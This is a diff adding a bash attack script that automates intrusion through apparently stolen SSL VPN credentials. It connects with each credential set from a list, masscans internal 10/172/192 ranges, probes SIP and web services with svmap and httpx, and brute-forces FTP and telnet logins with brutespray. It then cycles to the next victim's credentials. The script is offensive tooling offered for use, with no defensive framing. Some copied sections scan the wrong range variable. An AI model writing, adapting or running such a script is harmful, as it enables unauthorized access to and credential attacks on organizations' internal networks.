@@ -1,0 +1,124 @@
+#!/bin/bash
+echo -e "\e[1;41m----SSLVPN EXPLOITE_CODED MxM!-----\e[1;m"
+sleep 3
+pkill forti
+rm -rf go test.txt
+
+#while loop now 
+VAR4="I HAVE VPN credentials" 
+head -3  vpn.txt | 
+while read a; do
+echo $a | tee -a  go 
+done
+sleep 3
+echo ------------------------------------------------
+if cat go |   grep -E VPN_HOST\|VPN_USER\|VPN_PASS
+then 
+echo -e "\e[1;41m$VAR4\e[1;m"
+echo ------------------------------------------------
+fi
+
+
+
+# lets get down to business 
+cat con >>go
+bash go  >> test.txt  & 
+echo -e "\e[1;41mLETS GET DOWN TO WORK!\e[1;m"
+sleep 70
+
+# Veriables for Svmap  and Masscan and Httpx 
+
+VAR1=192.168.0.0/16
+VAR2=10.0.0.0/14
+VAR3=172.16.0.0/31
+						
+# connection check
+if cat test.txt | grep -E "Tunnel running"
+then 
+head -3 go >> results.txt
+
+echo -e "\e[1;41mVPN IS CONECTED AND FUCK OF!\e[1;m"
+echo ----------------------------------------------------------------- | tee -a results.txt
+
+
+# port scanner web 
+
+     echo ----------------$VAR1----------------
+docker run --rm adarnimrod/masscan -p5060,U:5060 $VAR1 >> 192.txt
+python3 fileformatter.py # here we clean the brut file
+docker run -i russmckendrick/sipvicious svmap.py -p5060-5062 -i 192.txt -t0.0 -v -m INVITE >> results.txt
+rm 192.txt # remove the temporary file
+docker run --rm adarnimrod/masscan -p80,443,8089 --rate=10000 $VAR1 >> 192.txt # Save scan masscan Range 
+python3 fileformatter.py # here we clean the brut file
+cat 192.txt | docker run -i projectdiscovery/httpx -sc -title -server -t 250 -leave-default-ports -p 80,443,8089  -nc -v >> results.txt
+rm 192.txt # remove the temporary file
+docker run --rm adarnimrod/masscan -p21,23 --rate=10000 $VAR1 >> 192.txt # Save scan masscan Range 
+python3 fileformatter.py # here we clean the brut file
+nmap -vv -iL 192.txt -p 21,23 -oX nmap.xml #  scan list ip masscan
+python3 brutespray.py --file nmap.xml --combo login.txt --service ftp,telnet --threads 5 --hosts 5 -c >> results.txt #  crack ftp,telnet,vnc
+rm nmap.xml # remove the temporary file
+rm 192.txt # remove the temporary file
+
+     echo ----------------$VAR2----------------
+docker run --rm adarnimrod/masscan -p5060,U:5060 $VAR1 >> 10.txt
+python3 fileformatter2.py # here we clean the brut file
+docker run -i russmckendrick/sipvicious svmap.py -p5060-5062 -i 10.txt -t0.0 -v -m INVITE >> results.txt
+rm 10.txt # remove the temporary file
+docker run --rm adarnimrod/masscan -p21,23 --rate=10000 $VAR1 >> 10.txt # Save scan masscan Range 
+python3 fileformatter2.py # here we clean the brut file
+nmap -vv -iL 10.txt -p 21,23 -oX nmap.xml #  scan list ip masscan
+python3 brutespray.py --file nmap.xml --combo login.txt --service ftp,telnet --threads 5 --hosts 5 -c >> results.txt #  crack ftp,telnet,vnc
+rm nmap.xml # remove the temporary file
+rm 10.txt # remove the temporary file
+
+     echo ----------------$VAR3----------------
+docker run --rm adarnimrod/masscan -p5060,U:5060 $VAR1 >> 172.txt
+python3 fileformatter3.py # here we clean the brut file
+docker run -i russmckendrick/sipvicious svmap.py -p5060-5062 -i 172.txt -t0.0 -v -m INVITE >> results.txt
+rm 172.txt # remove the temporary file
+docker run --rm adarnimrod/masscan -p80,443,8089 --rate=10000 $VAR1 >> 172.txt # Save scan masscan Range 
+python3 fileformatter3.py # here we clean the brut file
+cat 172.txt | docker run -i projectdiscovery/httpx -sc -title -server -t 250 -leave-default-ports -p 80,443,8089  -nc -v >> results.txt
+rm 172.txt # remove the temporary file
+docker run --rm adarnimrod/masscan -p21,23 --rate=10000 $VAR1 >> 172.txt # Save scan masscan Range 
+python3 fileformatter3.py # here we clean the brut file
+nmap -vv -iL 172.txt -p 21,23 -oX nmap.xml #  scan list ip masscan
+python3 brutespray.py --file nmap.xml --combo login.txt --service ftp,telnet --threads 5 --hosts 5 -c >> results.txt #  crack ftp,telnet,vnc
+rm nmap.xml # remove the temporary file
+rm 172.txt # remove the temporary file
+
+
+
+
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+echo "we scaned Everythings"
+sleep 15
+
+cat vpn.txt |  sed -e '1,3d' | tee -a aa.txt
+rm -rf  vpn.txt
+cat aa.txt | sed '/^$/d' | sed '/^[[:space:]]*$/d' | tee -a aaa.txt
+cat aaa.txt > vpn.txt
+rm -rf aa.txt aaa.txt
+
+
+./start
+ 
+else 
+echo -e "\e[1;41mVPN NOT CONECTED MAYBE PASSWORD IS WRONG!\e[1;m"
+sleep 20
+
+
+
+#not working vpn please check it manual 
+head -3 go | tee -a not_working_vpn.txt
+echo ----------------------------------------------------------------- | tee -a not_working_vpn.txt
+cat vpn.txt |  sed -e '1,3d' | tee -a aa.txt
+rm -rf  vpn.txt
+cat aa.txt | sed '/^$/d' | sed '/^[[:space:]]*$/d' | tee -a aaa.txt
+cat aaa.txt > vpn.txt
+rm -rf aa.txt aaa.txt
+pkill bash
+pkill forti
+./start
+fi 
